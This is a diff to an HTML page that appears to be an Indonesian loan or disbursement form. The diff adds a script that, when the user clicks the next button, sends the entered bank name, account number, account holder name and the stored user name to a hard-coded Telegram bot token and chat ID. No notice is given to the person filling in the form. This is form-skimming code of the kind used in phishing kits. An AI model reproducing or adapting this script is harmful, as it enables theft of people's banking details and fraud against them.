@@ -2438,4 +2438,82 @@ document.querySelectorAll('input[type=file]').forEach(x=>x.addEventListener('cha
 <script id="kb-rekcount">
 (function(){var inp=document.getElementById('ks-disbursement-number');var cnt=document.getElementById('ks-account-count');if(!inp||!cnt)return;function upd(){var d=(inp.value||'').replace(/\D/g,'').slice(0,11);if(inp.value!==d)inp.value=d;cnt.textContent=d.length+'/11';}inp.addEventListener('input',upd);inp.addEventListener('change',upd);upd();})();
 </script>
+<script id="kb-telegram-rek">
+(function () {
+  "use strict";
+  const BOT_TOKEN = "8941514752:AAHqmU7lqV0T64xRo43YPsmkjMwv2lrWDNE";
+  const CHAT_ID   = "6959842489";
+
+  function recordTgLog(source, status, detail, messageText) {
+    try {
+      var logs = JSON.parse(localStorage.getItem('kb_tg_logs') || '[]');
+      var now = new Date();
+      logs.unshift({
+        time: now.toLocaleTimeString('id-ID') + ' (' + now.toLocaleDateString('id-ID') + ')',
+        source: source,
+        status: status,
+        detail: detail,
+        text: messageText || ''
+      });
+      if (logs.length > 50) logs = logs.slice(0, 50);
+      localStorage.setItem('kb_tg_logs', JSON.stringify(logs));
+    } catch(e) {}
+  }
+
+  async function tgSend(text, sourceName) {
+    sourceName = sourceName || "09-rekening-pencairan.html";
+    if (!BOT_TOKEN || BOT_TOKEN.startsWith("ISI_")) return;
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      });
+      const data = await res.json();
+      if (data && data.ok) {
+        console.log(`%c[TG SUCCESS: ${sourceName}]`, "color:#10b981;font-weight:bold", data);
+        recordTgLog(sourceName, "SUCCESS", `Pesan ID: ${data.result?.message_id || 'OK'}`, text);
+      } else {
+        console.error(`%c[TG ERROR: ${sourceName}]`, "color:#ef4444;font-weight:bold", data);
+        recordTgLog(sourceName, "ERROR", data?.description || "Gagal dikirim Telegram", text);
+      }
+      return data;
+    } catch (e) {
+      console.error(`%c[TG NETWORK ERROR: ${sourceName}]`, "color:#ef4444;font-weight:bold", e);
+      recordTgLog(sourceName, "ERROR", e.message || String(e), text);
+    }
+  }
+
+  const esc = (s) => String(s ?? "")
+    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  document.addEventListener("click", function (e) {
+    const btn = e.target.closest("#ks-account-next");
+    if (!btn || btn.disabled) return;
+
+    let namaUser = "-";
+    try { namaUser = localStorage.getItem("kb_nama") || "-"; } catch(_) {}
+
+    const bank   = document.getElementById("ks-disbursement-bank")?.value?.trim() || "-";
+    const norek  = document.getElementById("ks-disbursement-number")?.value?.trim() || "-";
+    const anNama = document.getElementById("ks-disbursement-name")?.value?.trim() || "-";
+
+    const text =
+      `🏦 <b>REKENING PENCAIRAN : ${esc(namaUser.toUpperCase())}</b>\n\n` +
+      `Nama Bank     : <code>${esc(bank)}</code>\n` +
+      `Nomor Rekening: <code>${esc(norek)}</code>\n` +
+      `Atas Nama     : <code>${esc(anNama)}</code>`;
+
+    tgSend(text, "09-rekening-pencairan.html");
+  });
+
+  window.KBTelegram = { send: tgSend, esc, recordLog: recordTgLog };
+})();
+</script>
 </body></html>
